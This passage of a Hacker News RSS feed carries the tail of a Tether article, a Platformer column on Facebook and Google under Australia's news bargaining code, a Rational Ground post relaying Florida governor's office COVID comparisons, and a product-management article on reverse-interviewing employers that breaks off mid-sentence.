<p>This is far from an exhaustive look at Tether (I‚Äôm working on a book with <a href="https://twitter.com/CasPiancey">CasPiancey</a> for that), but hopefully you have a better understanding of the ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://bennettftomlin.com/2020/12/08/an-introduction-to-the-tether-bitfinex-controversy/">https://bennettftomlin.com/2020/12/08/an-introduction-to-the-tether-bitfinex-controversy/</a></em></p>]]>
            </description>
            <link>https://bennettftomlin.com/2020/12/08/an-introduction-to-the-tether-bitfinex-controversy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26188084</guid>
            <pubDate>Fri, 19 Feb 2021 00:55:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Facebook Calls Australia's Bluff]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26187669">thread link</a>) | @1cvmask
<br/>
February 18, 2021 | https://www.platformer.news/p/facebook-calls-australias-bluff | <a href="https://web.archive.org/web/*/https://www.platformer.news/p/facebook-calls-australias-bluff">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fbb6d2995-a033-40d3-b2ea-14dd040d770b_7952x5304.jpeg"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fbb6d2995-a033-40d3-b2ea-14dd040d770b_7952x5304.jpeg" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/bb6d2995-a033-40d3-b2ea-14dd040d770b_7952x5304.jpeg&quot;,&quot;height&quot;:971,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:9776013,&quot;alt&quot;:&quot;A map of Australia. Photo by Joey Csunyo / Unsplash&quot;,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null}" alt="A map of Australia. Photo by Joey Csunyo / Unsplash"></a><figcaption>Joey Csunyo / Unsplash</figcaption></figure></div><p>Yesterday, I wrote that <a href="https://www.platformer.news/p/australias-bad-bargain-with-platforms">Australia‚Äôs News Media Bargaining Code threatened to splinter the internet</a>. On Wednesday morning, the splintering arrived: Google cut a deal with News Corp. that will ensure its services continue to be provided in Australia, and Facebook walked away from the bargaining table and began preventing people from sharing news links from Australian publishers around the world. </p><p>I think Facebook basically did the right thing, and Google basically did the wrong thing, even though Google had a much tougher call to make. Today, let‚Äôs talk about why the tech giants made the decisions that they did, why Australia‚Äôs shakedown is rotten, and what‚Äôs likely to happen next. (If you didn‚Äôt <a href="https://www.platformer.news/p/australias-bad-bargain-with-platforms">read my piece on the subject yesterday</a>, it offers a lot of useful context for what follows. I‚Äôve made it free for all subscribers to read.)</p><p>In development for three years, the bargaining code is intended to give Australia‚Äôs heavily concentrated media industry more leverage as publishers seek direct payment from Google and Facebook for the right to display links to their work. It does this by forcing the platforms into binding arbitration with publishers who bring cases, and puts the decision for how much the platform has to pay the publishers into the hands of the arbiter. Each side throws out a number, and the arbiter picks the one they think is most fair. </p><p>(The arbiter does <em>not</em> pick a number in between, by the way; I got that wrong yesterday and have corrected the post.)</p><p>By design, the arbitration process favors the publisher. Also by design, it encourages platforms to avoid the process altogether by signing one-off deals with individual publishers in hopes that they can get better terms that way. </p><p><strong>I. Google</strong></p><p>Over the past few days, Google has been signing deals with the biggest publishers in Australia for exactly this reason. <a href="https://www.businessinsider.com/google-australia-news-technology-seven-west-media-2021-2#:~:text=Google%20signed%20up%20a%20major,force%20payments%20to%20media%20outlets.">Seven West Media got a deal</a>, <a href="https://www.theguardian.com/media/2021/feb/17/nine-agrees-to-join-google-news-showcase-in-australia-for-reported-30m-a-year#:~:text=Australia's%20biggest%20locally%2Downed%20media,laws%20being%20debated%20in%20parliament.">Nine Entertainment got a deal</a>, and on Wednesday, one of the country‚Äôs biggest conglomerates ‚Äî Rupert Murdoch‚Äôs News Corp. ‚Äî&nbsp;got its deal. In exchange for an undisclosed sum, Google will feature News Corp. articles in its News Showcase product in Australia and beyond.</p><p>‚ÄúAmong the News Corp publications joining Google News Showcase will be the<em> Wall Street Journal</em>, <em>Barron‚Äôs</em>, <em>MarketWatch</em>, and the <em>New York Post</em>; in the UK: the<em> Times</em> and the <em>Sunday Times</em>; and the <em>Sun</em>; and in Australia a range of news platforms, including the <em>Australian</em>, news.com.au, Sky News, and multiple metropolitan and local titles,‚Äù the company told me in a statement.</p><p>As announced, the deals pertain to <a href="https://blog.google/outreach-initiatives/google-news-initiative/google-news-showcase/">Google News Showcase</a>, a tab within Google News that contains licensed content from official partners. But the people I‚Äôve spoken with are operating under the assumption that if there‚Äôs a deal between Google and a big publisher in Australia, that publisher either can‚Äôt or won‚Äôt be dragged to arbitration for showing links and snippets of text in search results.</p><p>Search, of course, is what Google cares about the most, and explains why the company caved. Removing links to news&nbsp;stories from Google would break the search engine in Australia, <a href="https://blogs.microsoft.com/on-the-issues/2021/02/11/endorsement-australias-proposal-technology-news/">opening it up to rivals</a>. And so the company signed a bunch of deals under duress. </p><p>(It‚Äôs worth mentioning that any Australian publisher aggrieved by an unfair exchange of value with Google here could opt out of search results&nbsp;at any time by adding one line of HTML to their website. But almost none of them do, because traffic from Google drives significant advertising and subscription revenue to them.)</p><p>With its moves today, Google has now invited every other country to pursue a similar protection racket. Parliament members in Canada and the European Union have already endorsed measures similar to Australia‚Äôs. And a basic tenet of the open web ‚Äî that hyperlinks can be freely displayed on any website ‚Äî&nbsp;just took a body blow.</p><p>I‚Äôd feel better about this if publishers said a single word about how much of their new Google revenue that they planned to spend on journalists‚Äô salaries, or news gathering. </p><p>They didn‚Äôt, though, and why would they? Australia‚Äôs bargaining code doesn‚Äôt say one word about requiring that any of this money be spent on journalism, either.  </p><p><strong>II.</strong> <strong>Facebook</strong></p><p>Unlike Google, Facebook‚Äôs core service doesn‚Äôt rely heavily on news articles. The company estimates that only about 4 percent of posts on the network are works of journalism. It is not all that hard to imagine opening up Facebook and scrolling for a few minutes, never to see a link to a news article at all ‚Äî&nbsp;and in fact, millions of people do this every day.</p><p>And so it is perhaps less surprising that when Google blinked at Australia‚Äôs demand, Facebook walked away. Here‚Äôs William Easton, <a href="https://about.fb.com/news/2021/02/changes-to-sharing-and-viewing-news-on-facebook-in-australia/">Facebook‚Äôs managing director for Australia and New Zealand</a>:</p><blockquote><p>While the government has made some changes, the proposed law fundamentally&nbsp;<a href="https://australia.fb.com/post/our-response-to-australias-proposed-news-media-laws/">fails to understand</a>&nbsp;how our services work.</p><p>Unfortunately, this means people and news organisations in Australia are now restricted from posting news links and sharing or viewing Australian and international news content on Facebook. Globally, posting and sharing news links from Australian publishers is also restricted. To do this, we are using a combination of technologies to restrict news content and we will have processes to review any content that was inadvertently removed.</p></blockquote><p>And just like that, news articles originating in Australia disappeared from Facebook.</p><p>Easton says that in the past year, Facebook sent more than 5 billion clicks to Australian publishers, whose value he estimated at AU$ 407 million. If the current situation holds, Facebook will send those same publishers zero clicks ‚Äî&nbsp;a move that, I imagine, may force publishers to recalibrate in their minds the relative value that Facebook and publishers provide one another.</p><p>Of course, many critics were apoplectic that Facebook had taken this move, calling it <a href="https://twitter.com/matthewstoller/status/1362135211606220800?s=20">a vile act of censorship</a>, <a href="https://twitter.com/JuddLegum/status/1362172282102304769">unchecked greed</a>, and <a href="https://twitter.com/evelyndouek/status/1362171044136710144">destruction of the public sphere</a>. </p><p>Certainly the execution of the ban left something to be desired. </p><p>Rather than building a blacklist of news sites to restrict, Facebook tried using its machine learning systems to identify news publishers, and the systems went <a href="https://www.abc.net.au/news/2021-02-18/bom-health-authorities-betoota-caught-in-facebook-news-ban/13166394?section=technology">predictably haywire</a>. There were reports that government and emergency pages, nonprofit groups, and the Bureau of Meteorology <a href="https://twitter.com/maxchalm/status/1362160410984476672?s=21">could no longer share</a>. Given how long the possibility of restricting links has loomed, you‚Äôd think Facebook would have better prepared for it to arrive.</p><p>And while I don‚Äôt want to make light of these mistakes, to the extent that they teach Facebook‚Äôs user base to seek their news elsewhere, they can serve a noble purpose. I don‚Äôt know a single journalist who feels comfortable with social networks being anyone‚Äôs primary source of news, particularly after years of daily reporting on the misinformation and conspiracy theories that so often thrive on them. And so it is more than a little strange to see so many people insisting that Facebook is obligated to share publishers‚Äô content, on whatever terms those publishers set.</p><p>Some, <a href="https://twitter.com/WillOremus/status/1362132040544628736?s=20">like OneZero‚Äôs Will Oremus</a>, have noted that removing high-quality news sources from Facebook will likely mean a boost for lower-quality blog posts, memes, and other junk. That seems fair, and I do think it bears watching. But what if, in the meantime, Australians simply ‚Ä¶ visit websites? Subscribe to newsletters? Read ‚Ä¶ books? I realize I sound hopelessly naive here. But if this is the beginning of more people coming to understand the value in visiting trusted news sources directly, I think we‚Äôd all be better off. Publishers included!</p><p>In reality, though, I suspect the great Australian news outage of 2021 will be short lived. Australia‚Äôs treasurer, a leading figure in the negotiations, <a href="https://twitter.com/joshfrydenberg/status/1362144150712315905?s=21">said he spoke with Mark Zuckerberg today</a>, and that negotiations continue. (<a href="https://www.nytimes.com/2021/02/17/business/media/australia-google-pay-for-news.html">Fun fact from the </a><em><a href="https://www.nytimes.com/2021/02/17/business/media/australia-google-pay-for-news.html">New York Times</a></em>: Australia‚Äôs treasurer was also ‚Äú<a href="https://www.smh.com.au/entertainment/celebrity/ryan-stokes-society-wedding-a-sizzler-20161202-gt30re.html" title="">the best man at the wedding of Ryan Stokes</a>, who is a son of Kerry Stokes, the billionaire owner of Seven West Media, one of the companies that have reached a deal with Google.‚Äù)</p><p>‚ÄúWe will continue to engage with the government on amendments to the law, with the aim of achieving a stable, fair path for both Facebook and publishers,‚Äù Facebook told me today when I asked for an update.</p><p>In the meantime, though, I‚Äôm glad Facebook called publishers‚Äô bluff. </p><p><strong>III. What‚Äôs next</strong></p><p>I wish Australia would take Facebook‚Äôs rejection as a sign it should rethink its approach to media regulation entirely. It could just tax companies based on their revenues, for example. It could earmark those revenues to support journalism ‚Äî nonprofit public media, even, <a href="http://www.orangemedianetwork.com/blog/screengaze/the-importance-of-public-broadcasting/article_dda75496-e27e-11e6-a558-2f6b46140340.html">which has consistently been shown to have powerful civic benefits</a>. Or it could pursue a bargaining code that requires big media conglomerates to create and support <em>jobs</em> in journalism, rather than simply accept tens of millions of dollars and spend them however they like ‚Äî or just return it to shareholders.</p><p>In reality, though, none of that seems likely to happen. Google‚Äôs capitulation means that Australian crony capitalism is now likely to be exported worldwide. Legacy media outlets will become richer ‚Äî&nbsp;and also more dependent on the tech giants that they excoriate daily for having too much power over them. All the while, the media industry will continue to consolidate, and it will be harder to get or keep a job in journalism.</p><p>A bargaining code that truly sought to level the playing field between the platforms and the public would take these realities into account. There is still time to amend it before Parliament takes a vote, and here‚Äôs hoping that lawmakers do ‚Äî both&nbsp;in Australia and beyond it.</p><h3>Message received</h3><p>Y‚Äôall really, really prefer the standard linking format. So we‚Äôre back to normal today ‚Äî though I still feel like I could make these feel more valuable somehow; maybe just arranging them differently. I‚Äôll keep you posted, but thanks to everyone who wrote in yesterday with feedback!</p><h3>The Ratio</h3><p><em>Today in news that could affect public perception of the big tech companies. See if you can spot today‚Äôs ‚Ä¶</em></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.platformer.news/p/facebook-calls-australias-bluff">https://www.platformer.news/p/facebook-calls-australias-bluff</a></em></p>]]>
            </description>
            <link>https://www.platformer.news/p/facebook-calls-australias-bluff</link>
            <guid isPermaLink="false">hacker-news-small-sites-26187669</guid>
            <pubDate>Fri, 19 Feb 2021 00:07:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Florida outperformed lockdown states on excess deaths, education, and economy]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 4 (<a href="https://news.ycombinator.com/item?id=26187395">thread link</a>) | @Pausanias
<br/>
February 18, 2021 | https://rationalground.com/floridas-covid-19-response-has-outperformed-lockdown-states-on-excess-deaths-education-and-the-economy/ | <a href="https://web.archive.org/web/*/https://rationalground.com/floridas-covid-19-response-has-outperformed-lockdown-states-on-excess-deaths-education-and-the-economy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    	<div>

			

			<!--<h5>jenniferhcabrera</h5>!-->

			<!--<h5>Posted on February 16th, 2021</h5>!-->

			
<figure><img loading="lazy" width="853" height="510" src="https://rationalground.com/wp-content/uploads/2021/02/unnamed-44.png" alt="" srcset="https://rationalground.com/wp-content/uploads/2021/02/unnamed-44.png 853w, https://rationalground.com/wp-content/uploads/2021/02/unnamed-44-300x179.png 300w, https://rationalground.com/wp-content/uploads/2021/02/unnamed-44-768x459.png 768w" sizes="(max-width: 853px) 100vw, 853px"></figure>



<p>BY JENNIFER CABRERA</p>



<p>According to data released today by Florida Governor Ron DeSantis√¢‚Ç¨‚Ñ¢ office, Florida is outperforming lockdown states like California and New York on all metrics. Florida has lower per-capita mortality, higher availability of in-person education, and a lower unemployment rate.</p>



<p><strong>Excess deaths</strong></p>



<ul><li>Compared to Florida, 34 states had a higher rate of all-cause mortality from 2019 to 2020, per capita. Higher-than-average increases indicate that states probably had extra deaths resulting from lockdown policies, not just from COVID-19.</li></ul>



<figure><img loading="lazy" width="851" height="479" src="https://rationalground.com/wp-content/uploads/2021/02/unnamed-2021-02-16T185337.679.jpg" alt="" srcset="https://rationalground.com/wp-content/uploads/2021/02/unnamed-2021-02-16T185337.679.jpg 851w, https://rationalground.com/wp-content/uploads/2021/02/unnamed-2021-02-16T185337.679-300x169.jpg 300w, https://rationalground.com/wp-content/uploads/2021/02/unnamed-2021-02-16T185337.679-768x432.jpg 768w" sizes="(max-width: 851px) 100vw, 851px"></figure>



<ul><li>Compared to Florida, 38 other states rank higher for per-capita COVID-19 mortality among seniors 65 and older.</li></ul>



<figure><img loading="lazy" width="851" height="479" src="https://rationalground.com/wp-content/uploads/2021/02/unnamed-2021-02-16T185401.219.jpg" alt="" srcset="https://rationalground.com/wp-content/uploads/2021/02/unnamed-2021-02-16T185401.219.jpg 851w, https://rationalground.com/wp-content/uploads/2021/02/unnamed-2021-02-16T185401.219-300x169.jpg 300w, https://rationalground.com/wp-content/uploads/2021/02/unnamed-2021-02-16T185401.219-768x432.jpg 768w" sizes="(max-width: 851px) 100vw, 851px"></figure>



<p><strong>Florida has fewer pediatric COVID-19 cases while having the highest rate of in-person instruction offered.</strong></p>



<ul><li>Schools have been open in Florida, and Florida still has fewer COVID-19 cases among kids when compared to other large states on a per capita basis. (New York is not included because they don√¢‚Ç¨‚Ñ¢t make pediatric cases publicly available).</li></ul>



<figure><img loading="lazy" width="851" height="479" src="https://rationalground.com/wp-content/uploads/2021/02/unnamed-2021-02-16T185436.454.jpg" alt="" srcset="https://rationalground.com/wp-content/uploads/2021/02/unnamed-2021-02-16T185436.454.jpg 851w, https://rationalground.com/wp-content/uploads/2021/02/unnamed-2021-02-16T185436.454-300x169.jpg 300w, https://rationalground.com/wp-content/uploads/2021/02/unnamed-2021-02-16T185436.454-768x432.jpg 768w" sizes="(max-width: 851px) 100vw, 851px"></figure>



<p><strong>From the beginning, Governor DeSantis has emphasized nursing homes and protecting the most vulnerable.</strong></p>



<ul><li>California and New York had significantly higher rates for new COVID-19 cases per 1 million compared to Florida.</li></ul>



<figure><img loading="lazy" width="856" height="512" src="https://rationalground.com/wp-content/uploads/2021/02/unnamed-45.png" alt="" srcset="https://rationalground.com/wp-content/uploads/2021/02/unnamed-45.png 856w, https://rationalground.com/wp-content/uploads/2021/02/unnamed-45-300x179.png 300w, https://rationalground.com/wp-content/uploads/2021/02/unnamed-45-768x459.png 768w" sizes="(max-width: 856px) 100vw, 856px"></figure>



<ul><li>California and New York had significantly higher hospitalizations per 1 million compared to Florida.</li></ul>



<figure><img loading="lazy" width="853" height="510" src="http://rationalground.com/wp-content/uploads/2021/02/unnamed-44.png" alt="" srcset="https://rationalground.com/wp-content/uploads/2021/02/unnamed-44.png 853w, https://rationalground.com/wp-content/uploads/2021/02/unnamed-44-300x179.png 300w, https://rationalground.com/wp-content/uploads/2021/02/unnamed-44-768x459.png 768w" sizes="(max-width: 853px) 100vw, 853px"></figure>



<ul><li>Governor DeSantis acted early in the pandemic to protect the state√¢‚Ç¨‚Ñ¢s most vulnerable, and his actions saved lives:<ul><li>Governor DeSantis established 23 COVID-19 dedicated nursing facilities across the state to prevent spread within long-term care facilities, help with hospital decompression, and protect long-term care patients. The Governor also required hospitals to test all individuals discharged to long-term care facilities and required these facilities to transfer COVID-19 positive residents if the facility was not equipped for appropriate care.</li><li>Governor DeSantis issued an executive order putting Seniors First and prioritizing seniors 65 and older to receive the vaccine. To date, 40% of Florida√¢‚Ç¨‚Ñ¢s nearly 4.5 million senior population have received a vaccine.</li><li>Governor DeSantis deployed Florida National Guard and Florida Department of Health Strike Teams to nursing homes and assisted living facilities for testing throughout the pandemic, and now for vaccine distribution.</li><li>Governor DeSantis launched a pilot program for homebound seniors, including Holocaust survivors, WWII and Korean War veterans, and anti-communist Bay of Pigs veterans, to prioritize and protect our Greatest Generation.</li></ul></li></ul>



<p><strong>Florida√¢‚Ç¨‚Ñ¢s economic recovery is leading the nation.</strong></p>



<ul><li>Florida leads the nation√¢‚Ç¨‚Ñ¢s most populous states in unemployment rate for December 2020, and Florida was well below the national average.</li></ul>



<figure><img loading="lazy" width="856" height="481" src="https://rationalground.com/wp-content/uploads/2021/02/unnamed-46.png" alt="" srcset="https://rationalground.com/wp-content/uploads/2021/02/unnamed-46.png 856w, https://rationalground.com/wp-content/uploads/2021/02/unnamed-46-300x169.png 300w, https://rationalground.com/wp-content/uploads/2021/02/unnamed-46-768x432.png 768w" sizes="(max-width: 856px) 100vw, 856px"></figure>



<ul><li>Home sales in Florida continued to increase during the height of the pandemic as Americans fled lockdown states.</li></ul>



<figure><img loading="lazy" width="854" height="480" src="https://rationalground.com/wp-content/uploads/2021/02/unnamed-47.png" alt="" srcset="https://rationalground.com/wp-content/uploads/2021/02/unnamed-47.png 854w, https://rationalground.com/wp-content/uploads/2021/02/unnamed-47-300x169.png 300w, https://rationalground.com/wp-content/uploads/2021/02/unnamed-47-768x432.png 768w" sizes="(max-width: 854px) 100vw, 854px"></figure>



<ul><li>U-Haul migration data shows that Florida ranks 3<sup>rd</sup>&nbsp;in the nation for one-way rental moving vans. California ranks 50<sup>th</sup>&nbsp;(at the bottom), and New York ranks 42<sup>nd</sup>.</li></ul>



<figure><img loading="lazy" width="853" height="480" src="https://rationalground.com/wp-content/uploads/2021/02/unnamed-48.png" alt="" srcset="https://rationalground.com/wp-content/uploads/2021/02/unnamed-48.png 853w, https://rationalground.com/wp-content/uploads/2021/02/unnamed-48-300x169.png 300w, https://rationalground.com/wp-content/uploads/2021/02/unnamed-48-768x432.png 768w" sizes="(max-width: 853px) 100vw, 853px"></figure>

		</div>

	</div></div>]]>
            </description>
            <link>https://rationalground.com/floridas-covid-19-response-has-outperformed-lockdown-states-on-excess-deaths-education-and-the-economy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26187395</guid>
            <pubDate>Thu, 18 Feb 2021 23:38:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to know if you're interviewing at a product-led company]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26187334">thread link</a>) | @skotzko
<br/>
February 18, 2021 | https://andrewskotzko.com/how-to-know-if-youre-interviewing-at-a-product-led-company/ | <a href="https://web.archive.org/web/*/https://andrewskotzko.com/how-to-know-if-youre-interviewing-at-a-product-led-company/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><main id="genesis-content"><article aria-label="How to know if you‚Äôre interviewing at a product-led company"><div><div><figure><img loading="lazy" width="732" height="307" src="https://andrewskotzko.com/wp-content/uploads/2021/02/TN9ww6_OmxtkBn4j3aKpJw7c2cQZJsdZSEt6FlMAgqTBTD_i2Z4gzRmNvW42Jx1CFbIreJIpDTB4i2QR_bH5JGIoxZH5EIkH3kTji7t8uMhgBO61qtJ84EHpab-QgVWt53Y2hF2_.png" alt="" srcset="https://andrewskotzko.com/wp-content/uploads/2021/02/TN9ww6_OmxtkBn4j3aKpJw7c2cQZJsdZSEt6FlMAgqTBTD_i2Z4gzRmNvW42Jx1CFbIreJIpDTB4i2QR_bH5JGIoxZH5EIkH3kTji7t8uMhgBO61qtJ84EHpab-QgVWt53Y2hF2_.png 732w, https://andrewskotzko.com/wp-content/uploads/2021/02/TN9ww6_OmxtkBn4j3aKpJw7c2cQZJsdZSEt6FlMAgqTBTD_i2Z4gzRmNvW42Jx1CFbIreJIpDTB4i2QR_bH5JGIoxZH5EIkH3kTji7t8uMhgBO61qtJ84EHpab-QgVWt53Y2hF2_-300x126.png 300w" sizes="(max-width: 732px) 100vw, 732px"></figure></div><p>I‚Äôm seeing this sentiment pop up with alarming frequency. Many product people are dealing with career uncertainty ‚Äî and not just the ‚Äúwill my company make it through the pandemic?‚Äù variety. Without the usual distractions of life available, things that were easily overlooked are now front and center.</p><p>And what are many of these product people realizing without the distractions of normal life?</p><p><strong>They‚Äôre set up to fail.</strong></p><p>Their work environment and culture is not set up to create strong products. It is distinctly <em>not</em> set up to empower the collaboration of product, design, and engineering to build things that matter.</p><p>This has led many to realize it‚Äôs time for a job change.</p><p>As product people, we want to work in a product-led company. A place that truly values the craft and contribution of product, and that empowers individuals and teams to work to their highest potential. A place that is built around creating amazing products that truly make life better for the people they‚Äôre trying to serve.</p><p>We all know it‚Äôs possible. It‚Äôs what the best product companies are doing. Yet despite many attempts tried, there are many frustrated PMs that can‚Äôt seem to get their work environment to change.</p><p>This is because, frankly, they joined the wrong company in the first place.</p><p>They took a role where good product work occurs in spite of the dominant practices and culture, not because of them.</p><p>Jobs like this waste precious years of your career. I‚Äôve made this mistake too, and it hurts. I hope this article helps you avoid it in the future.</p><p>It‚Äôs actually really hard to know how strong of a product culture and environment that a team has prior to living in it. Even within the FAANG companies, every team and manager is different and you need to find out the truth.</p><p>After reading this, you should have a go-to set of questions to ask the next companies you interview. These will help you suss out the reality of how the company operates before you commit to an offer. I‚Äôm writing this for product managers, but it‚Äôs equally relevant to design and engineering.</p><p>So, what <em>can</em> you do to make sure that your next company is <em>actually</em> a good place to be a product person?</p><p>The key to solving this is to <em>interview companies the same way we interview users and customers</em>.</p><p>Think of this as ‚ÄúThe Mom Test,‚Äù applied to product job interviews.</p><h2 id="interviewing-companies-like-users-customers">Interviewing companies like users/customers<a href="#interviewing-companies-like-users-customers"></a></h2><h3 id="why-you-need-to-do-this">Why you need to do this<a href="#why-you-need-to-do-this"></a></h3><p>One of the most common complaints in the job search process is ‚Äúthis place isn‚Äôt what I thought it would be.‚Äù</p><p>People join a company full of vigor and excitement, and within a few months they are bored, going through the motions, and fantasizing yet again about being somewhere that ‚Äúgets product.‚Äù</p><p>It doesn‚Äôt have to be this way.</p><div><figure><img loading="lazy" src="https://andrewskotzko.com/wp-content/uploads/2021/02/t3pawlU7qxNyGBkCZMWQLQxfOUct30uDWgZqusxwAHau6pIJ6hAh530ETyv3vLRSapIHNHHSBevu-zemY4za4V5cY7ONyvP97DtHfMILgezcPqd8eOngk1mPY7nD9smhqwVqNA64.jpg" alt="" width="480" height="308" srcset="https://andrewskotzko.com/wp-content/uploads/2021/02/t3pawlU7qxNyGBkCZMWQLQxfOUct30uDWgZqusxwAHau6pIJ6hAh530ETyv3vLRSapIHNHHSBevu-zemY4za4V5cY7ONyvP97DtHfMILgezcPqd8eOngk1mPY7nD9smhqwVqNA64.jpg 640w, https://andrewskotzko.com/wp-content/uploads/2021/02/t3pawlU7qxNyGBkCZMWQLQxfOUct30uDWgZqusxwAHau6pIJ6hAh530ETyv3vLRSapIHNHHSBevu-zemY4za4V5cY7ONyvP97DtHfMILgezcPqd8eOngk1mPY7nD9smhqwVqNA64-300x192.jpg 300w" sizes="(max-width: 480px) 100vw, 480px"></figure></div><p>As PMs, we invest so much getting ready for those damn product interviews that we often forget: <strong>we need to interview the company just as hard as they‚Äôre interviewing us.</strong></p><p>This is called ‚Äúreverse interviewing.‚Äù As product people, we already know how to do this.</p><p>We know how to interview customers and users. We know to ask questions to account for bias and speculation, surface actual behavior, and understand how decisions are really made.</p><p>When applying for a job, we need to apply those same skills to interview our interviewers.</p><p>As Marty Cagan said to me in <a href="https://pod.fo/e/af7e6">our podcast conversation</a>:</p><blockquote><p><em>From your point of view, your job is to learn as much as possible about how that company really works, and especially how that manager would be like to work for.</em></p></blockquote><p>Let‚Äôs see how to do just that.</p><h3 id="principles-for-interviewing">Principles for interviewing<a href="#principles-for-interviewing"></a></h3><p>Two excellent resources on interviewing users‚Äîwhich you really should read if you haven‚Äôt‚Äîare <a href="https://www.producttalk.org/2016/03/customer-interview-questions/">this post by Teresa Torres</a> and <a href="https://amzn.to/2MXuN2D">The Mom Test</a>.</p><p>I distill their points into these two overarching principles for interviewing:</p><ol><li>Separate your research questions and interview questions</li><li>Ask questions that uncover actual past behavior, rather than speculative or aspirational future behavior</li></ol><h3 id="separate-research-questions-from-interview-questions">Separate research questions from interview questions<a href="#separate-research-questions-from-interview-questions"></a></h3><p>The user research community has learned that we often can‚Äôt directly ask our questions and get reliable answers.</p><p>The way around this is to map our research questions to interview questions.</p><p>Research questions are what we really want to know. Interview questions are what we actually ask to get the interviewee telling stories that show their behavior. (This is a concept I learned from Teresa Torres in her <a href="https://learn.producttalk.org/p/continuous-interviewing">excellent interviewing course</a>.)</p><p>For example, imagine you work at Spotify and your team is assigned to work on reducing the churn rate.</p><p>Let‚Äôs say you‚Äôve learned that users who play a given playlist consistently at the start of their workday are retained ~20% longer than those who don‚Äôt. Your research questions might be:</p><ul><li>Why are people using the same playlist every day?</li><li>What are people looking for in such a playlist? How do they choose playlists?</li><li>When, where, and how do people find these playlists?</li><li>What is unique about playlists that have high retention rates?</li><li>Are users more likely to exhibit the desired behavior with a playlist they follow, or one they create?</li></ul><p>Some interview questions to get stories containing this information could be:</p><ul><li>Tell me about your morning playlist? How did you first find it?</li><li>Walk me through your day. Start with the moment you woke up.</li><li>Tell me about how you start your workday</li><li>Tell me about the last playlist you discovered that you really liked</li><li>Tell me about the last playlist you made yourself</li></ul><p>Each of these prompts a story about actual behavior, and we can then ask more questions to go deeper. A well-extracted story can often answer multiple research questions at once.</p><p>Now let‚Äôs talk about how to apply this to finding a great product environment to work in.</p><h3 id="the-droids-were-looking-for">The droids we‚Äôre looking for <a href="#the-droids-were-looking-for"></a></h3><p>What we‚Äôre seeking in our job search: empowered product teams.</p><p>Empowered product teams‚Äîas opposed to delivery or feature teams‚Äîonly exist in environments with strong product leadership.</p><p>Empowered product teams:</p><ol id="block-31aad864-d497-461b-8f72-65138efd7926"><li>are small, cross-functional, and durable</li><li>address product risks early with collaborative product discovery, and regularly ‚Äúkill their darlings‚Äù en route to ideas that work</li><li>are accountable to delivering results rather than output</li></ol><p>These teams exist in product orgs with an environment that has:</p><ol id="block-31aad864-d497-461b-8f72-65138efd7926"><li>a focused and insight-rich product strategy</li><li>regular, ongoing cadence of lightweight research directly with their user/customer, rather than handing this off to a research group</li><li>people connected to the product vision in a visceral, energetic way</li><li>managers that are proactively and regularly coaching and developing team members</li><li>an equal partnership with the rest of the business</li></ol><p>Teams like this are great places to be a product person. These are where magical career experiences and products come from. And they are made up of ordinary, hard-working, sincere people just like you.</p><p>(To go deep on the idea of empowered teams, read Marty Cagan‚Äôs latest book, <a href="https://amzn.to/3cFAo8G">EMPOWERED</a>, and listen to the <a href="https://pod.fo/e/af7e6">deep dive conversation I had with him about the ideas in the book</a>.)</p><p>Our research question is: ‚Äúis this a place that empowers product people/teams?‚Äù</p><p>Now that we know what we‚Äôre looking for, how do we assess a given job opportunity?</p><p>This is where our interview questions come in.</p><h2 id="reverse-interview-questions">Reverse interview questions<a href="#reverse-interview-questions"></a></h2><p>Since every company we talk to will <em>say</em> they‚Äôre a good product company, we need to dig deeper. Just as with users, we can‚Äôt take them at their word. We need evidence from real behavior.</p><p>Based on my own career, research, listener questions and podcast interviews with product people, here are my top reverse interview questions (click to jump to the section for the given question):</p><ol><li><a href="#1-what-were-the-last-few-things-your-team-has-built-and-shipped-and-how-did-you-decide-to-do-those">What were the last few things your team has built and shipped, and how did you decide to do those?</a></li><li><a href="#2-whens-the-last-time-you-talked-with-your-customers-users-how-often-have-you-done-that-in-the-last-month">When‚Äôs the last time you talked with your customers? How often have you done that in the last month?</a></li><li><a href="#3-what-was-the-last-feature-or-product-your-team-killed">What was the last feature or product your team killed?</a></li><li><a href="#4-can-you-describe-your-product-vision">Can you describe your product vision?</a></li><li><a href="#5-tell-me-about-the-last-coaching-session-you-had-with-your-manager-how-often-did-that-happen-last-month">Tell me about the last coaching session you had with your manager. How often did that happen last month?</a></li></ol><p>Let‚Äôs discuss the rationale for each of these, and what you want to hear/avoid.</p><h3 id="1-what-were-the-last-few-things-your-team-has-built-and-shipped-and-how-did-you-decide-to-do-those">1) What were the last few things your team has built and shipped, and how did you decide to do those?<a href="#1-what-were-the-last-few-things-your-team-has-built-and-shipped-and-how-did-you-decide-to-do-those"></a></h3><h4 id="why-youre-asking">Why you‚Äôre asking<a href="#why-youre-asking"></a></h4><p>We need to understand the core of how work happens here. How is work assigned? Who decides what gets built, and how?</p><p>This is the 